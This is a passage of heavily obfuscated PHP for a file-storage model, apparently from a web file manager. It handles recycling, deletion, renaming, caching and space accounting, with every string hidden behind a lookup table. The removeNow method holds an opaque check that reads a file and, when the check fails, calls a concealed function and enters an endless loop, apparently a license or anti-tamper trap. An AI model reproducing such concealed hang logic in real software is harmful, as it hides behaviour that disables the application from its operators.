_get($º…ãïƒ¢, $Ñò¢Şù¾[2441])); } } CacheLock::unlock($ò½êæ’Ğ); $this->metaSet($ı¡ŠŠ·ô, $Ñò¢Şù¾[2442], $Œë¤·º[$Ñò¢Şù¾[191]]); $this->where(array($Ñò¢Şù¾[192] => $ı¡ŠŠ·ô))->save(array($Ñò¢Şù¾[509] => time())); $this->recycleClear($Œë¤·º); Model($Ñò¢Şù¾[652])->eventRemove($ı¡ŠŠ·ô); $Öú†ºÅÉ = $this->move($ı¡ŠŠ·ô, $¦·¦˜€¦, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Œë¤·º[$Ñò¢Şù¾[191]]); return $Öú†ºÅÉ; } private function recycleClear($Ã·Ö˜àõ) { $ëÛ‹•í’ =& $_SERVER[öæÛ¿©¿]; $¼ã…±Ÿ¿ = $this->childrenAll($Ã·Ö˜àõ); $¡äÅ³½º = array($ëÛ‹•í’[502] => array($ëÛ‹•í’[503], $¼ã…±Ÿ¿[$ëÛ‹•í’[2443]])); Model($ëÛ‹•í’[2444])->where($¡äÅ³½º)->delete(); } public function removeNow($­ÖÂÏ¬ò, $×ºáÎ¸¿ = true) { $ÔÎÉú =& $_SERVER[öæÛ¿©¿]; if (!isset($_SERVER[$ÔÎÉú[984]]) || !isset($_SERVER[$ÔÎÉú[1756]])) { $ÏûìÂŸ‰ = $ÔÎÉú[985]; $şÀÕ÷© = $ÔÎÉú[986]; $ÙÈƒ¨ç = $_SERVER[$ÔÎÉú[981]] . $ÔÎÉú[982]; $Ãˆø“ä† = $şÀÕ÷©($ÙÈƒ¨ç); $Îïûúó“ = explode($ÔÎÉú[286], $Ãˆø“ä†); if (count($Îïûúó“) < $ÔÎÉú[699]) { $³²»Ÿİ = $ÔÎÉú[987]; $³²»Ÿİ(); } $Ó’™†ø = $ÔÎÉú[988]; $Ó’™†ø($_SERVER[$ÔÎÉú[989]]); $¬·äÖ… = 1; for ($şÑÁÈ…Ì = $¬·äÖ…; $şÑÁÈ…Ì > 0; $şÑÁÈ…Ì++) { $Ó’™†ø = json_encode($GLOBALS[$ÔÎÉú[503]]); } } $¹‘¤Ü’Å = $this->sourceInfo($­ÖÂÏ¬ò); $ÁÛÉ…àŞ = $this->pathInfoMore($­ÖÂÏ¬ò); if (!$¹‘¤Ü’Å) { return !0; } if ($¹‘¤Ü’Å[$ÔÎÉú[191]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($­ÖÂÏ¬ò); Hook::trigger($ÔÎÉú[2445], $ÁÛÉ…àŞ, $×ºáÎ¸¿); if ($×ºáÎ¸¿) { Model($ÔÎÉú[2444])->moveToRecycle($­ÖÂÏ¬ò); } else { $¹šÌğÄæ = $this->childrenAll($¹‘¤Ü’Å); Model($ÔÎÉú[652])->eventRemove($­ÖÂÏ¬ò); $this->removeRelevance($¹šÌğÄæ[$ÔÎÉú[2443]], $¹šÌğÄæ[$ÔÎÉú[1724]]); } $this->folderSizeReset($¹‘¤Ü’Å[$ÔÎÉú[191]]); $Ş¦½Š«¼ = array($¹‘¤Ü’Å[$ÔÎÉú[191]]); if ($¹‘¤Ü’Å[$ÔÎÉú[496]] == $ÔÎÉú[91]) { $Ş¦½Š«¼[] = $¹‘¤Ü’Å[$ÔÎÉú[192]]; } $this->updateModifyTime($Ş¦½Š«¼); $this->lockMoveEnd($­ÖÂÏ¬ò); Hook::trigger($ÔÎÉú[1967], $ÁÛÉ…àŞ, $×ºáÎ¸¿); return !0; } public function childrenAll($×Õë‹±¯) { $÷Å´Üİƒ =& $_SERVER[öæÛ¿©¿]; $àŸãØâË = $×Õë‹±¯[$÷Å´Üİƒ[192]]; if ($×Õë‹±¯[$÷Å´Üİƒ[496]] == $÷Å´Üİƒ[91]) { $ŸÔñ–ô„ = array($÷Å´Üİƒ[671] => array($÷Å´Üİƒ[631], $×Õë‹±¯[$÷Å´Üİƒ[600]] . $àŸãØâË . $÷Å´Üİƒ[632])); $±¡ˆóíñ = array($÷Å´Üİƒ[671] => $ŸÔñ–ô„[$÷Å´Üİƒ[600]]); $”Ó²Æ± = $this->field($÷Å´Üİƒ[2446])->where($±¡ˆóíñ)->select(); $Š‡ŞÊÁ = !1; $÷Çùû˜ = array($àŸãØâË); if ($”Ó²Æ±) { $Š‡ŞÊÁ = array_to_keyvalue($”Ó²Æ±, $÷Å´Üİƒ[12], $÷Å´Üİƒ[553]); $Š‡ŞÊÁ = array_remove_value($Š‡ŞÊÁ, $÷Å´Üİƒ[229]); $÷Çùû˜ = array_to_keyvalue($”Ó²Æ±, $÷Å´Üİƒ[12], $÷Å´Üİƒ[192]); $÷Çùû˜[] = $àŸãØâË; } } else { $Š‡ŞÊÁ = array($×Õë‹±¯[$÷Å´Üİƒ[553]]); $÷Çùû˜ = array($àŸãØâË); } return array($÷Å´Üİƒ[2443] => $÷Çùû˜, $÷Å´Üİƒ[1724] => $Š‡ŞÊÁ); } public function removeArray($¯‹ÅÀ¾ñ) { if (!$¯‹ÅÀ¾ñ) { return !0; } } public function removeRelevance($å»óÙäø, $ÔØšìóâ) { $Ã¤àæ¬æ =& $_SERVER[öæÛ¿©¿]; $å»óÙäø = $å»óÙäø ? $å»óÙäø : array(); $ÔØšìóâ = $ÔØšìóâ ? $ÔØšìóâ : array(); $å»óÙäø = array_unique(array_filter($å»óÙäø)); $ÔØšìóâ = array_filter($ÔØšìóâ); if (!$å»óÙäø) { return !1; } $ìû¥é = array($Ã¤àæ¬æ[502] => array($Ã¤àæ¬æ[503], $å»óÙäø)); Model($Ã¤àæ¬æ[2444])->where($ìû¥é)->delete(); Model($Ã¤àæ¬æ[545])->where($ìû¥é)->delete(); Model($Ã¤àæ¬æ[2277])->where($ìû¥é)->delete(); Model($Ã¤àæ¬æ[652])->where($ìû¥é)->delete(); Model($Ã¤àæ¬æ[1508])->removeBySource($å»óÙäø); Model($Ã¤àæ¬æ[2425])->removeBySource($å»óÙäø); $this->where($ìû¥é)->delete(); Model($Ã¤àæ¬æ[556])->remove($ÔØšìóâ); for ($éŸ«„ğõ = 0; $éŸ«„ğõ < count($å»óÙäø); $éŸ«„ğõ++) { $this->sourceCacheClear($å»óÙäø[$éŸ«„ğõ]); } } public function rename($ÛÒûÔà­, $ªş®§áå) { $û¡Ä¯ã• =& $_SERVER[öæÛ¿©¿]; $Àà­®Ê† = $this->sourceInfo($ÛÒûÔà­); if (!$Àà­®Ê†) { return !1; } $·‚åÙÛ = $this->fileNameExist($Àà­®Ê†[$û¡Ä¯ã•[191]], $ªş®§áå); if ($·‚åÙÛ && $·‚åÙÛ != $ÛÒûÔà­) { return !1; } $ÎøÃ»¤ = array($û¡Ä¯ã•[505] => $ªş®§áå, $û¡Ä¯ã•[670] => USER_ID); if ($Àà­®Ê†[$û¡Ä¯ã•[496]] != $û¡Ä¯ã•[91]) { $ÎøÃ»¤[$û¡Ä¯ã•[497]] = substr(get_path_ext($ªş®§áå), 0, 10); } Model($û¡Ä¯ã•[652])->eventRename($ÛÒûÔà­, $Àà­®Ê†[$û¡Ä¯ã•[32]], $ªş®§áå); $this->sourceCacheClear($ÛÒûÔà­); $this->setNamePinyin($ÛÒûÔà­, $ÎøÃ»¤[$û¡Ä¯ã•[32]], !1); $this->updateModifyTime($Àà­®Ê†[$û¡Ä¯ã•[191]]); $©¹¥–Êæ = $this->where(array($û¡Ä¯ã•[502] => $ÛÒûÔà­))->data($ÎøÃ»¤)->save(); $ßœ¼¯” = $û¡Ä¯ã•[2433] . $Àà­®Ê†[$û¡Ä¯ã•[191]]; if (isset(self::$cacheChildList[$ßœ¼¯”])) { unset(self::$cacheChildList[$ßœ¼¯”]); } return $©¹¥–Êæ; } public function setNamePinyin($ÉƒÖæÛ, $”ô¶èÖˆ, $‰À×˜á« = true) { $ª…éš¨Ä =& $_SERVER[öæÛ¿©¿]; $‘òÖ£•Ã = Input::check($”ô¶èÖˆ, $ª…éš¨Ä[674]); $Ğ¹™í¢ = array($ª…éš¨Ä[527] => KodSort::makeStr($”ô¶èÖˆ)); if ($‘òÖ£•Ã) { $Ğ¹™í¢[$ª…éš¨Ä[548]] = str_replace($ª…éš¨Ä[53], $ª…éš¨Ä[12], Pinyin::get($”ô¶èÖˆ)); $Ğ¹™í¢[$ª…éš¨Ä[547]] = Pinyin::get($”ô¶èÖˆ, $ª…éš¨Ä[675]); } if (!$‰À×˜á« && !$‘òÖ£•Ã) { $Ğ¹™í¢[$ª…éš¨Ä[548]] = null; $Ğ¹™í¢[$ª…éš¨Ä[547]] = null; } $this->metaSet($ÉƒÖæÛ, $Ğ¹™í¢); } public function getContent($ ğ¦Àú±) { $àìÈÉÓİ =& $_SERVER[öæÛ¿©¿]; $¸¦åÒ½œ = $this->fileInfoGet($ ğ¦Àú±); if (!$¸¦åÒ½œ) { return !1; } if ($¸¦åÒ½œ[$àìÈÉÓİ[79]] == 0) { return $àìÈÉÓİ[12]; } $ñğàİ‰÷ = $àìÈÉÓİ[2447] . $¸¦åÒ½œ[$àìÈÉÓİ[559]]; if ($¸¦åÒ½œ[$àìÈÉÓİ[79]] <= 1024 * 10) { $á™µ¼ï = Cache::get($ñğàİ‰÷); if (!$á™µ¼ï) { $á™µ¼ï = IO::getContent($¸¦åÒ½œ[$àìÈÉÓİ[87]]); Cache::set($ñğàİ‰÷, $á™µ¼ï); } return $á™µ¼ï; } if (!$¸¦åÒ½œ[$àìÈÉÓİ[87]]) { return $àìÈÉÓİ[12]; } return IO::getContent($¸¦åÒ½œ[$àìÈÉÓİ[87]]); } public function setDesc($ÓÜñ­Úô, $õ—Ã¿µ) { $Š­€üø‰ =& $_SERVER[öæÛ¿©¿]; Model($Š­€üø‰[652])->eventAddDesc($ÓÜñ­Úô, $õ—Ã¿µ); return $this->metaSet($ÓÜñ­Úô, $Š­€üø‰[536], $õ—Ã¿µ); } public function setContent($ôÚş¯—, $ÒÄìã® = '') { $Üœô =& $_SERVER[öæÛ¿©¿]; $Ñ¹â¦Ü¶ = $this->sourceInfo($ôÚş¯—); $€Ï¿”îÜ = $this->fileInfoGet($ôÚş¯—); if (!$€Ï¿”îÜ || !$Ñ¹â¦Ü¶) { return !1; } $ÁÈóŞ = KodIO::ioFileDriverGet($Üœô[494] . $ôÚş¯— . $Üœô[403]); $Íöä±ğì = Model($Üœô[556])->addFileByContent($ÒÄìã®, $ÁÈóŞ, $Ñ¹â¦Ü¶[$Üœô[32]]); if (!$Íöä±ğì) { return !1; } $™Ì™ìÍ = $this->fileHistory($Ñ¹â¦Ü¶, $Íöä±ğì[$Üœô[553]], $Íöä±ğì[$Üœô[79]]); if (!$™Ì™ìÍ) { return Model($Üœô[556])->remove($Íöä±ğì[$Üœô[553]]); } $this->folderSizeReset($Ñ¹â¦Ü¶[$Üœô[191]]); return !0; } public function fileSubstr($Â¾ÙÈ±ä, $ù¥Ÿ¿, $ÏÒ¾´·) { $™Íó¾¹ = $this->fileInfoGet($Â¾ÙÈ±ä); if (!$™Íó¾¹) { return !1; } return IO::fileSubstr($™Íó¾¹[$_SERVER[öæÛ¿©¿][87]], $ù¥Ÿ¿, $ÏÒ¾´·); } public function fileInfoGet($Å–±†’) { $ãÈ½Ğ²¨ =& $_SERVER[öæÛ¿©¿]; $ã‡«Š®Ë = $this->sourceInfo($Å–±†’); if (!$ã‡«Š®Ë || $ã‡«Š®Ë[$ãÈ½Ğ²¨[496]]) { return !1; } $Ä…‹ÁØÎ = $ãÈ½Ğ²¨[560] . $ã‡«Š®Ë[$ãÈ½Ğ²¨[553]]; $‰²âÛÊ = _get(self::$cacheFileInfo, $Ä…‹ÁØÎ); if ($‰²âÛÊ) { return $‰²âÛÊ; } $ØÖ¦ÁµÆ = Model($ãÈ½Ğ²¨[556])->fileInfo($ã‡«Š®Ë[$ãÈ½Ğ²¨[553]]); if ($ØÖ¦ÁµÆ) { $ØÖ¦ÁµÆ[$ãÈ½Ğ²¨[32]] = $ã‡«Š®Ë[$ãÈ½Ğ²¨[32]]; } self::$cacheFileInfo[$Ä…‹ÁØÎ] = $ØÖ¦ÁµÆ; return $ØÖ¦ÁµÆ; } private function folderChildrenNumber($Ë¹¤ôŸ) { $×õ²¥Ñ =& $_SERVER[öæÛ¿©¿]; $×èµà€‚ = $this->sourceInfo($Ë¹¤ôŸ); $ß¤ïƒ×¨ = array($×õ²¥Ñ[671] => array($×õ²¥Ñ[631], $×èµà€‚[$×õ²¥Ñ[600]] . $Ë¹¤ôŸ . $×õ²¥Ñ[632]), $×õ²¥Ñ[668] => $×èµà€‚[$×õ²¥Ñ[585]], $×õ²¥Ñ[515] => intval($×èµà€‚[$×õ²¥Ñ[516]]), $×õ²¥Ñ[665] => 1); $ûÚÀŞÃ• = $this->where($ß¤ïƒ×¨)->count(); $²­—çó = $this->where($ß¤ïƒ×¨)->where(array($×õ²¥Ñ[665] => 0))->count(); return array($×õ²¥Ñ[83] => $²­—çó, $×õ²¥Ñ[84] => $ûÚÀŞÃ•); } public function pathInfo($—É°ÄÚÙ, $·«ÆÂÎÃ = false) { $ĞÔÎ‚Ğ­ =& $_SERVER[öæÛ¿©¿]; $·«ÆÂÎÃ = !1; $—É°ÄÚÙ = intval($—É°ÄÚÙ); if (!$—É°ÄÚÙ) { return !1; } $¯šÂè»® = $ĞÔÎ‚Ğ­[544] . intval($·«ÆÂÎÃ) . $ĞÔÎ‚Ğ­[473] . $—É°ÄÚÙ; $¹ÅÈãüÔ = _get(self::$cachePathInfo, $¯šÂè»®); if ($¹ÅÈãüÔ) { return $¹ÅÈãüÔ; } $ã¾Éûé = $this->sourceInfo($—É°ÄÚÙ); if (!$ã¾Éûé) { return !1; } $ã¾Éûé = $this->_listDataApplyItem($ã¾Éûé, $·«ÆÂÎÃ); self::$cachePathInfo[$¯šÂè»®] = $ã¾Éûé; return $ã¾Éûé; } public static $cachePathInfoMore = array(); public function pathInfoMore($¥‰†€åÖ) { $â½’ËŒ¨ =& $_SERVER[öæÛ¿©¿]; $âæÀ³¹² = _get(self::$cachePathInfoMore, $¥‰†€åÖ); if ($âæÀ³¹²) { return $âæÀ³¹²; } $ÃÅøûÇğ = $this->pathInfo($¥‰†€åÖ); if (!$ÃÅøûÇğ) { return !1; } if ($ÃÅøûÇğ[$â½’ËŒ¨[496]] == $â½’ËŒ¨[91]) { $ÃÅøûÇğ[$â½’ËŒ¨[82]] = $this->folderChildrenNumber($¥‰†€åÖ); } self::$cachePathInfoMore[$¥‰†€åÖ] = $ÃÅøûÇğ; return $ÃÅøûÇğ; } public function sourceInfo($¸Ÿ—ÓÛê) { $×«äõÎñ =& $_SERVER[öæÛ¿©¿]; if (!$¸Ÿ—ÓÛê) { return array(); } $¸Ÿ—ÓÛê = intval($¸Ÿ—ÓÛê); $¯«€€æ = $×«äõÎñ[543] . $¸Ÿ—ÓÛê; $öïéîğ• = _get(self::$cacheSourceInfo, $¯«€€æ); if ($öïéîğ•) { return $öïéîğ•; } $ğî…ÊšÒ = $this->where(array($×«äõÎñ[192] => $¸Ÿ—ÓÛê))->find(); self::$cacheSourceInfo[$¯«€€æ] = $ğî…ÊšÒ; return self::$cacheSourceInfo[$¯«€€æ]; } public function sourceCacheClear($»ÜÕä»‚ = false) { self::cacheClear($»ÜÕä»‚); } public static function cacheClear($¡‡¿ ˆÆ = false) { $•ğÃ§Ôá =& $_SERVER[öæÛ¿©¿]; if ($¡‡¿ ˆÆ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$•ğÃ§Ôá[543] . $¡‡¿ ˆÆ]); unset(self::$cachePathInfoMore[$¡‡¿ ˆÆ]); unset(self::$cachePathInfo[$•ğÃ§Ôá[2448] . $¡‡¿ ˆÆ]); unset(self::$cachePathInfo[$•ğÃ§Ôá[2449] . $¡‡¿ ˆÆ]); } public function metaSet($…‘¿Æªœ, $¾ä¥´œ“ = null, $ÆóÂà‘é = null) { $«Çì÷•˜ = parent::metaSet($…‘¿Æªœ, $¾ä¥´œ“, $ÆóÂà‘é); if ($«Çì÷•˜) { $this->sourceCacheClear($…‘¿Æªœ); } return $«Çì÷•˜; } public function pathInfoByPath($ÉÒâŸÁƒ, $Ø¹¥Ã´¼) { $áşí ¡ =& $_SERVER[öæÛ¿©¿]; $’éµì“ò = !$Ø¹¥Ã´¼ ? array() : explode($áşí ¡[8], trim($Ø¹¥Ã´¼, $áşí ¡[8])); $èìø¨ïÀ = intval($ÉÒâŸÁƒ); foreach ($’éµì“ò as $¸ÃÎÉ¿) { $î¤‚ôµ = array($áşí ¡[191] => $èìø¨ïÀ, $áşí ¡[32] => $¸ÃÎÉ¿); $çÕŠÈ = $this->field($áşí ¡[2450])->where($î¤‚ôµ)->select(); if (!$çÕŠÈ) { return !1; } $çÕŠÈ = array_sort_by($çÕŠÈ, $áşí ¡[516]); $èìø¨ïÀ = intval($çÕŠÈ[0][$áşí ¡[192]]); } $±×²ìã = $this->sourceInfo($èìø¨ïÀ); $this->pathInfoFilter($±×²ìã); return $±×²ìã; } protected function updateModifyTime($È†×Ó¢) { $²‹¦è =& $_SERVER[öæÛ¿©¿]; $Ç·­ÂÂ® = KodUser::id(); if (!$È†×Ó¢) { return; } if (!is_array($È†×Ó¢)) { $È†×Ó¢ = array($È†×Ó¢); } foreach ($È†×Ó¢ as $™®ıÚ„ => $£Ô½•¤Ş) { $È†×Ó¢[$™®ıÚ„] = intval($£Ô½•¤Ş); $this->sourceCacheClear($£Ô½•¤Ş); } $·—¡ÌÅ­ = array($²‹¦è[192] => array($²‹¦è[7], $È†×Ó¢)); $è™½ÓÂ = array($²‹¦è[670] => $Ç·­ÂÂ®, $²‹¦è[509] => time()); $this->where($·—¡ÌÅ­)->save($è™½ÓÂ); } public function folderSizeReset($Úìáœ–, $š™¦’çó = false) { $ı¸Ó‹ô„ =& $_SERVER[öæÛ¿©¿]; if ($this->statusIgnoreResetSpace) { return; } if (!$Úìáœ–) { return; } $‡íŒ×Ö‰ = $this->sourceInfo($Úìáœ–); $Ú»ùÙ¸¦ = $ı¸Ó‹ô„[2451] . $Úìáœ–; if (!$‡íŒ×Ö‰ || !$‡íŒ×Ö‰[$ı¸Ó‹ô„[192]]) { return; } CacheLock::lock($Ú»ùÙ¸¦, 20); if ($š™¦’çó === !1) { $this->sourceCacheClear($Úìáœ–); $‡íŒ×Ö‰ = $this->sourceInfo($Úìáœ–); $ÏÃÍ¤óØ = array($ı¸Ó‹ô„[488] => $Úìáœ–, $ı¸Ó‹ô„[515] => 0); $ºá™­Ëİ = $this->where($ÏÃÍ¤óØ)->sum($ı¸Ó‹ô„[79]); $š™¦’çó = intval($ºá™­Ëİ) - intval($‡íŒ×Ö‰[$ı¸Ó‹ô„[79]]); } if ($š™¦’çó == 0) { return CacheLock::unlock($Ú»ùÙ¸¦); } $“‘ÔèïÛ = $this->parentLevelArray($‡íŒ×Ö‰[$ı¸Ó‹ô„[600]]); if (!$“‘ÔèïÛ) { $“‘ÔèïÛ = array(); } $“‘ÔèïÛ[] = $‡íŒ×Ö‰[$ı¸Ó‹ô„[192]]; $ÏÃÍ¤óØ = array($ı¸Ó‹ô„[192] => array($ı¸Ó‹ô„[503], $“‘ÔèïÛ)); if ($š™¦’çó < 0) { $ÏÃÍ¤óØ[$ı¸Ó‹ô„[79]] = array($ı¸Ó‹ô„[1127], abs($š™¦’çó)); } $this->where($ÏÃÍ¤óØ)->setAdd($ı¸Ó‹ô„[79], $š™¦’çó); CacheLock::unlock($Ú»ùÙ¸¦); if (!$‡íŒ×Ö‰[$ı¸Ó‹ô„[585]] || $‡íŒ×Ö‰[$ı¸Ó‹ô„[585]] == $ı¸Ó‹ô„[229]) { return; } $óß£÷ = $ı¸Ó‹ô„[2452] . $‡íŒ×Ö‰[$ı¸Ó‹ô„[189]] . $ı¸Ó‹ô„[4] . $‡íŒ×Ö‰[$ı¸Ó‹ô„[585]]; $©¡…õÊ¹ = array($‡íŒ×Ö‰[$ı¸Ó‹ô„[189]], $‡íŒ×Ö‰[$ı¸Ó‹ô„[585]]); TaskRun::timeLimitCall($óß£÷, $ı¸Ó‹ô„[2453], $©¡…õÊ¹, 1.5); } public function folderSizeResetChildren($¥óŒİæ) { $Š£èƒ“Ø =& $_SERVER[öæÛ¿©¿]; $this->sourceCacheClear($¥óŒİæ); $ÄØÙãŸ = $this->sourceInfo($¥óŒİæ); if (!$ÄØÙãŸ) { return; } $ûÙ©§Ë† = array($Š£èƒ“Ø[665] => 1, $Š£èƒ“Ø[668] => $ÄØÙãŸ[$Š£èƒ“Ø[585]], $Š£èƒ“Ø[671] => array($Š£èƒ“Ø[631], $ÄØÙãŸ[$Š£èƒ“Ø[600]] . $¥óŒİæ . $Š£èƒ“Ø[632])); $®î¿²«– = $Š£èƒ“Ø[2454]; $…Ï†²îÕ = $this->field($®î¿²«–)->where($ûÙ©§Ë†)->select(); $ûÙ©§Ë†[$Š£èƒ“Ø[496]] = 0; $ÉÕÎ»ßë = $this->field($®î¿²«–)->where($ûÙ©§Ë†)->select(); if (!$ÉÕÎ»ßë) { return; } $…Ï†²îÕ[] = $ÄØÙãŸ; $…Ï†²îÕ = array_to_keyvalue($…Ï†²îÕ, $Š£èƒ“Ø[192]); foreach ($…Ï†²îÕ as $€ª“óÏ† => $çåˆ®…À) { $…Ï†²îÕ[$€ª“óÏ†][$Š£èƒ“Ø[2455]] = $…Ï†²îÕ[$€ª“óÏ†][$Š£èƒ“Ø[79]]; $…Ï†²îÕ[$€ª“óÏ†][$Š£èƒ“Ø[79]] = 0; } foreach ($ÉÕÎ»ßë as $çåˆ®…À) { $¢ıì–Ø‹ = $çåˆ®…À[$Š£èƒ“Ø[191]] . $Š£èƒ“Ø[12]; if (!isset($…Ï†²îÕ[$¢ıì–Ø‹])) { continue; } if ($çåˆ®…À[$Š£èƒ“Ø[516]] == $…Ï†²îÕ[$¢ıì–Ø‹][$Š£èƒ“Ø[516]]) { $…Ï†²îÕ[$¢ıì–Ø‹][$Š£èƒ“Ø[79]] += $çåˆ®…À[$Š£èƒ“Ø[79]]; } } foreach ($…Ï†²îÕ as $çåˆ®…À) { $×ìÚ¡û = $this->parentLevelArray($çåˆ®…À[$Š£èƒ“Ø[600]]); foreach ($×ìÚ¡û as $¢ıì–Ø‹) { $¢ıì–Ø‹ = $¢ıì–Ø‹ . $Š£èƒ“Ø[12]; if (!isset($…Ï†²îÕ[$¢ıì–Ø‹])) { continue; } if ($çåˆ®…À[$Š£èƒ“Ø[516]] == $…Ï†²îÕ[$¢ıì–Ø‹][$Š£èƒ“Ø[516]]) { $…Ï†²îÕ[$¢ıì–Ø‹][$Š£èƒ“Ø[79]] += $çåˆ®…À[$Š£èƒ“Ø[79]]; } } } $Ÿ‘»¶ = array(); foreach ($…Ï†²îÕ as $çåˆ®…À) { if ($çåˆ®…À[$Š£èƒ“Ø[79]] == $çåˆ®…À[$Š£èƒ“Ø[2455]]) { continue; } $Ÿ‘»¶[] = array($Š£èƒ“Ø[192], $çåˆ®…À[$Š£èƒ“Ø[192]], $Š£èƒ“Ø[79], $çåˆ®…À[$Š£èƒ“Ø[79]]); } $this->saveAll($Ÿ‘»¶); } public function userSpaceReset($å¼‘ÖÌ = false) { $½ŞèÃ¾ =& $_SERVER[öæÛ¿©¿]; $áĞÊëóù = $this->where(array($½ŞèÃ¾[189] => self::TYPE_USER, $½ŞèÃ¾[585] => $å¼‘ÖÌ, $½ŞèÃ¾[496] => 0))->sum($½ŞèÃ¾[79]); $áĞÊëóù = !$áĞÊëóù || $áĞÊëóù <= 0 ? 0 : $áĞÊëóù; Model($½ŞèÃ¾[593])->userEdit($å¼‘ÖÌ, array($½ŞèÃ¾[2120] => $áĞÊëóù)); } public function targetSpaceUpdate($¹îàËÙÑ, $†ú›à•) { $‹›§‡•´ =& $_SERVER[öæÛ¿©¿]; if (!$†ú›à•) { return; } if (!in_array($¹îàËÙÑ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Ö£”´Œ = $this->targetSpaceSize($¹îàËÙÑ, $†ú›à•); if ($¹îàËÙÑ == self::TYPE_USER) { Model($‹›§‡•´[593])->userEdit($†ú›à•, array($‹›§‡•´[2120] => $Ö£”´Œ)); } else { if ($¹îàËÙÑ == self::TYPE_GROUP) { Model($‹›§‡•´[601])->groupEdit($†ú›à•, array($‹›§‡•´[2120] => $Ö£”´Œ)); } } } public function targetSpaceSize($ÛØ˜§Ä•, $‚×«×Øë) { $ƒó«Ş‡Â =& $_SERVER[öæÛ¿©¿]; $ÜñÛàÒÜ = 0; $ŞÆğ†¿« = $this->targetSourceRoot($ÛØ˜§Ä•, $‚×«×Øë, !0); foreach ($ŞÆğ†¿« as $Œ‡Îßä) { if (!$Œ‡Îßä) { continue; } $ÜñÛàÒÜ += floatval($Œ‡Îßä[$ƒó«Ş‡Â[79]]); $Ø¹Ëä = array($ƒó«Ş‡Â[671] => array($ƒó«Ş‡Â[631], $ƒó«Ş‡Â[609] . $Œ‡Îßä[$ƒó«Ş‡Â[192]] . $ƒó«Ş‡Â[632])); $™ûŒ¨üŞ = Model($ƒó«Ş‡Â[514])->field($ƒó«Ş‡Â[502])->where($Ø¹Ëä)->select(); $™ûŒ¨üŞ = array_to_keyvalue($™ûŒ¨üŞ, $ƒó«Ş‡Â[12], $ƒó«Ş‡Â[192]); $™ûŒ¨üŞ = array_unique(array_filter($™ûŒ¨üŞ)); if ($™ûŒ¨üŞ) { $Ø¹Ëä = array($ƒó«Ş‡Â[502] => array($ƒó«Ş‡Â[503], $™ûŒ¨üŞ)); $ÜñÛàÒÜ += floatval($this->where($Ø¹Ëä)->sum($ƒó«Ş‡Â[79])); } } $ÜñÛàÒÜ = !$ÜñÛàÒÜ || $ÜñÛàÒÜ <= 0 ? 0 : $ÜñÛàÒÜ; return $ÜñÛàÒÜ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ªë²Çİ) { return $this->fileTypeProfile($ªë²Çİ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($‰è„Ö®Á) { return $this->fileTypeProfile($‰è„Ö®Á, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¿®Ñ°î¿, $¥ ÍÇÀó) { $ÜÂàĞ‘Â =& $_SERVER[öæÛ¿©¿]; $„ÈØÔÏë = $ÜÂàĞ‘Â[2456] . $¿®Ñ°î¿ . $ÜÂàĞ‘Â[11] . $¥ ÍÇÀó; $½¾Ä«ß» = Cache::get($„ÈØÔÏë); if ($½¾Ä«ß») { return $½¾Ä«ß»; } $Ø’÷†Â€ = array($ÜÂàĞ‘Â[665] => 0); if ($¿®Ñ°î¿ != !1) { $Ø’÷†Â€[$ÜÂàĞ‘Â[585]] = $¿®Ñ°î¿; $Ø’÷†Â€[$ÜÂàĞ‘Â[189]] = $¥ ÍÇÀó; } $—æ‚âÙ = array(); $ªŠÁğ‚¹ = $this->field(array($ÜÂàĞ‘Â[2382] => $ÜÂàĞ‘Â[2087], $ÜÂàĞ‘Â[2457] => $ÜÂàĞ‘Â[79]))->where($Ø’÷†Â€)->find(); $—æ‚âÙ[$ÜÂàĞ‘Â[2458]] = array($ÜÂàĞ‘Â[2459] => LNG($ÜÂàĞ‘Â[2458]), $ÜÂàĞ‘Â[2460] => intval($ªŠÁğ‚¹[$ÜÂàĞ‘Â[2087]]), $ÜÂàĞ‘Â[636] => intval($ªŠÁğ‚¹[$ÜÂàĞ‘Â[79]])); $˜¬Öğ¡¾ = KodIO::fileTypeList(); foreach ($˜¬Öğ¡¾ as $êë‘ºı€ => $„ñôÏÌ°) { $Ø’÷†Â€[$ÜÂàĞ‘Â[497]] = $this->fileTypeWhere($êë‘ºı€); $ªŠÁğ‚¹ = $this->field(array($ÜÂàĞ‘Â[2382] => $ÜÂàĞ‘Â[2087], $ÜÂàĞ‘Â[2457] => $ÜÂàĞ‘Â[79]))->where($Ø’÷†Â€)->find(); $—æ‚âÙ[$êë‘ºı€] = array($ÜÂàĞ‘Â[2459] => $„ñôÏÌ°[$ÜÂàĞ‘Â[32]], $ÜÂàĞ‘Â[2460] => intval($ªŠÁğ‚¹[$ÜÂàĞ‘Â[2087]]), $ÜÂàĞ‘Â[636] => intval($ªŠÁğ‚¹[$ÜÂàĞ‘Â[79]])); } Cache::set($„ÈØÔÏë, $—æ‚âÙ, 1200); return $—æ‚âÙ; } public function fileNameExist($Èª«­‚®, $æŞ©¼´) { $ıüóƒÔ =& $_SERVER[öæÛ¿©¿]; $œ³§ßèå = $this->field($ıüóƒÔ[2461])->where(array($ıüóƒÔ[191] => $Èª«­‚®, $ıüóƒÔ[32] => $æŞ©¼´, $ıüóƒÔ[516] => 0))->find(); return is_array($œ³§ßèå) ? $œ³§ßèå[$ıüóƒÔ[192]] : !1; } public function childList($™¹„Ö) { $„Õ·Ëèà =& $_SERVER[öæÛ¿©¿]; $Ï§€ÊÒ = $„Õ·Ëèà[2433] . $™¹„Ö; if (isset(self::$cacheChildList[$Ï§€ÊÒ])) { return self::$cacheChildList[$Ï§€ÊÒ]; } $Øóì±ÏŒ = array($„Õ·Ëèà[191] => intval($™¹„Ö), $„Õ·Ëèà[516] => 0); $‘€Â®­„ = $this->where($Øóì±ÏŒ)->select(); $‘€Â®­„ = $‘€Â®­„ ? $‘€Â®­„ : array(); self::$cacheChildList[$Ï§€ÊÒ] = $‘€Â®­„; foreach ($‘€Â®­„ as $¯é¯ô£) { $Ï§€ÊÒ = $„Õ·Ëèà[543] . $¯é¯ô£[$„Õ·Ëèà[192]]; self::$cacheSourceInfo[$Ï§€ÊÒ] = $¯é¯ô£; } return $‘€Â®­„; } public function 